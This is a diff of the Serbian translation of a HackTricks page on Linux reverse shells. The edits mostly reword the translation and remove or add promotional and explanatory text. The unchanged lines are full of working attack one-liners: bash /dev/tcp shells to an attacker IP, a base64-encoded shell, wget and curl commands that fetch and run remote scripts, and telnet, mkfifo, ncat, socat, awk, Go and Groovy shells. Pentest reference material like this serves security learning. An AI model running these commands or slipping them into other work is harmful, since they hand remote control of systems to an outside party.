@@ -6,7 +6,7 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -33,9 +33,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Bezbedan simbolni shell
+### Simbol bezbedna ljuska
 
-Ne zaboravite da proverite i sa drugim shell-ovima: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
+Ne zaboravite da proverite i druge ljuske: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -46,10 +46,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Objasnjenje Shell-a
 
-1. **`bash -i`**: Ovaj deo komande pokreće interaktivnu (`-i`) Bash ljusku.
+1. **`bash -i`**: Ovaj deo komande pokreće interaktivnu (`-i`) Bash shell.
 2. **`>&`**: Ovaj deo komande je skraćena oznaka za **preusmeravanje kako standardnog izlaza** (`stdout`) tako i **standardne greške** (`stderr`) na **isti odredište**.
 3. **`/dev/tcp/<NAPADAC-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP konekciju ka navedenoj IP adresi i portu**.
-* **Preusmeravanjem izlaznih i grešnih tokova u ovaj fajl**, komanda efikasno šalje izlaz interaktivne ljuske sesije ka računaru napadača.
+* **Preusmeravanjem izlaznih i grešnih tokova u ovaj fajl**, komanda efikasno šalje izlaz interaktivne shell sesije na mašinu napadača.
 4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na isto odredište kao standardni izlaz (`stdout`)**.
 
 ### Kreiraj u fajlu i izvrši
@@ -59,7 +59,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Ako naiđete na **RCE ranjivost** unutar web aplikacije zasnovane na Linuxu, može se desiti da postane teško **dobiti reverzni shell** zbog prisustva Iptables pravila ili drugih filtera. U takvim scenarijima, razmotrite kreiranje PTY shella unutar kompromitovanog sistema korišćenjem cijevi.
+Ako naiđete na **RCE ranjivost** unutar veb aplikacije zasnovane na Linuxu, može se desiti da postane teško **dobiti reverzni shell** zbog prisustva Iptables pravila ili drugih filtera. U takvim scenarijima, razmotrite kreiranje PTY shella unutar kompromitovanog sistema korišćenjem cevi.
 
 Kod možete pronaći na [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
@@ -69,7 +69,7 @@ Samo trebate izmeniti:
 * Prefiks i sufiks vašeg payload-a (ako postoje)
 * Način slanja payload-a (zaglavlja? podaci? dodatne informacije?)
 
-Zatim, možete jednostavno **slati komande** ili čak **koristiti `upgrade` komandu** da biste dobili potpuni PTY (imajte na umu da se cijevi čitaju i pišu sa oko 1.3s kašnjenja).
+Zatim, možete jednostavno **slati komande** ili čak **koristiti `upgrade` komandu** da biste dobili potpuni PTY (imajte na umu da se cevi čitaju i pišu sa oko 1.3s kašnjenja).
 
 ## Netcat
 ```bash
@@ -86,6 +86,8 @@ Proverite na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
+
+Telnet je jednostavan protokol za pristup udaljenom terminalu. To je često korišćeno za testiranje konekcija na portove i pristup udaljenim sistemima. Telnet je često korišćen u fazi prikupljanja informacija tokom testiranja penetracije.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -98,7 +100,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Da biste poslali komandu, napišite je, pritisnite Enter i pritisnite CTRL+D (da zaustavite STDIN)
+Da biste poslali komandu, napišite je, pritisnite Enter, a zatim pritisnite CTRL+D (da zaustavite STDIN)
 
 **Žrtva**
 ```bash
@@ -145,14 +147,6 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Pronađite ranjivosti koje su najvažnije kako biste ih mogli brže popraviti. Intruder prati vašu površinu napada, pokreće proaktivne skenove pretnji, pronalazi probleme širom vašeg celokupnog tehnološkog skupa, od API-ja do veb aplikacija i sistemima u oblaku. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
@@ -238,8 +232,6 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
-
-Awk je moćan alat za obradu teksta koji se često koristi u shell skriptama. Može se koristiti za pretraživanje i obradu teksta, kao i za izvlačenje i prikazivanje određenih informacija iz datoteka. Awk koristi posebnu sintaksu za definisanje akcija koje treba izvršiti nad tekstom, što ga čini veoma fleksibilnim alatom za analizu podataka.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -249,7 +241,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Da biste poslali komandu, napišite je, pritisnite Enter, a zatim pritisnite CTRL+D (da zaustavite STDIN)
+Da biste poslali komandu, napišite je, pritisnite Enter i pritisnite CTRL+D (da zaustavite STDIN)
 
 **Žrtva**
 ```bash
@@ -286,7 +278,7 @@ Ovo će pokušati da se poveže sa vašim sistemom na portu 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Da biste uhvatili obrnutu ljusku, možete koristiti (koja će slušati na portu 6001):
+Za hvatanje reverznog šella možete koristiti (koji će osluškivati na portu 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -295,7 +287,7 @@ Xnest :1
 ```
 ## Groovy
 
-od [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NAPOMENA: Java reverzna ljuska takođe radi za Groovy
+od [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NAPOMENA: Java reverse shell takođe radi za Groovy
 ```bash
 String host="localhost";
 int port=8044;
